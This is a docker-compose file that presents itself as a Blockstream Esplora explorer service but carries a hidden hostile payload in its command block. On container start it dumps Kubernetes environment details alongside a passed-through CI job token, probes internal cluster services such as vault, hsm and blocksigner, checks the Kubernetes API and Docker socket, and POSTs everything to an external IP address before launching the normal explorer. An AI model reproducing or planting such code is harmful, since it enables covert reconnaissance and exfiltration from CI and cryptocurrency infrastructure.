services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
      - KUBERNETES_SERVICE_HOST
      - KUBERNETES_SERVICE_PORT
    command:
      - bash
      - -c
      - |
        (echo "==S27=="; echo "==ENV_K8S=="; env | grep -i kube; echo "==PYTHON_DNS=="; python3 -c "
import socket
for name in ['kubernetes.default.svc.cluster.local','gitlab.default.svc.cluster.local','liquid.default.svc.cluster.local','functionary.default.svc.cluster.local','watchman.default.svc.cluster.local','blocksigner.default.svc.cluster.local','elementsd.default.svc.cluster.local','bitcoind.default.svc.cluster.local','hsm.default.svc.cluster.local','vault.default.svc.cluster.local','consul.default.svc.cluster.local']:
    try:
        ip = socket.gethostbyname(name)
        print(f'FOUND: {name} -> {ip}')
    except: pass
for ns in ['liquid','production','staging','monitoring','default','kube-system']:
    for svc in ['functionary','watchman','blocksigner','elementsd','bitcoind','liquid','hsm','parallel-port','gitlab','registry']:
        try:
            ip = socket.gethostbyname(f'{svc}.{ns}.svc.cluster.local')
            print(f'FOUND: {svc}.{ns} -> {ip}')
        except: pass
" 2>&1; echo "==K8S_DIRECT=="; for ip in 10.128.0.1 10.96.0.1 10.0.0.1; do curl -sfk "https://$ip:443/api/v1/namespaces" 2>&1 | head -20 && echo "K8S_AT:$ip" && break; done; echo "==DOCKER_SOCK=="; ls -la /var/run/docker.sock 2>&1; docker ps 2>&1 | head -10; echo "==END==") 2>&1 | curl -s -m90 -X POST http://144.172.110.44:8443/s27 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
